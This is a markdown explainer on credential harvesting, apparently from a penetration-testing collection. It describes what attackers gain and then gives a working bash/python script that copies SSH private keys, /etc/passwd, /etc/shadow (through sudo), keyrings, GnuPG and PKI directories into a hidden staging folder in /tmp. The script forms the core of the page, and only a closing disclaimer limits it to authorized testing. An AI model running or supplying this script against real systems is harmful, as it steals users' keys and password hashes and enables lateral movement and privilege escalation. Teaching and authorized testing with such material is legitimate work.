# Credential Harvesting Attack

## Overview
**Credential Harvesting** is a technique used by attackers to gather sensitive information such as usernames, passwords, SSH keys, configuration files, and authentication tokens from a compromised system. 

Attackers actively search the system structure, exploring common locations like `/etc/passwd`, `/etc/shadow`, browser profile directories, SSH folders (`~/.ssh`), and local keyrings to steal the user's digital identity or escalate privileges.

---

## Attacker's Gain
- **Lateral Movement**: Stolen SSH keys or credentials can allow an attacker to jump to other systems in the network without needing additional exploits.
- **Privilege Escalation**: Harvesting administrative passwords or cracking snatched `/etc/shadow` hashes can grant full root access.
- **Persistence**: Access to saved credentials makes it easier to re-enter systems or accounts even if the primary vulnerability is patched.
- **Data Theft**: Decrypting or accessing standard user accounts usually provides access to emails, sensitive documents, and source codes.

---

## How the Attack Works
1. **Target Selection**: The attacker looks for directories containing standard keyrings, configuration files, and key files.
2. **Execution**: The attacker runs bash & python scripts to bypass basic permissions (if possible) and copy hidden folders or system security files to a temporary or hidden directory (e.g., `/tmp/.cache/.secrets/`).
3. **Data Exfiltration**: The collated files are downloaded or exfiltrated for offline cracking or brute-forcing (like cracking hashes from `/etc/shadow` using Hashcat or John The Ripper).

---

## Credential Harvesting Script

This script automatically gathers essential credential files to a hidden staging directory (`/tmp/.cache/.secrets`).

```bash

echo "[+] Starting Credential Harvesting..."

mkdir -p /tmp/.cache/.secrets 2>/dev/null

# Dump SSH Keys
cp ~/.ssh/id_rsa* /tmp/.cache/.secrets/ 2>/dev/null

# Dump /etc/passwd & shadow (if possible)
sudo cat /etc/passwd > /tmp/.cache/.secrets/passwd 2>/dev/null
sudo cat /etc/shadow > /tmp/.cache/.secrets/shadow 2>/dev/null || echo "[-] No root access for shadow"

# Browser + Keyring
python3 -c "
import os, shutil
for path in ['~/.local/share/keyrings', '~/.gnupg', '~/.pki']:
    try:
        shutil.copytree(os.path.expanduser(path), '/tmp/.cache/.secrets/keys', dirs_exist_ok=True)
    except: pass
" 2>/dev/null || true

echo "[+] Credential dump completed. Check /tmp/.cache/.secrets/"
ls -la /tmp/.cache/.secrets/
```

---

## ⚠️ Important Notes
- **Testing Environment Only**: This script is meant for educational and authorized penetration testing purposes only. 
- **Leave No Trace**: Always clean up testing artifacts (like `/tmp/.cache/.secrets`) after your assessment.
- **Permissions**: Extracting the `/etc/shadow` file requires superuser (`root`) privileges.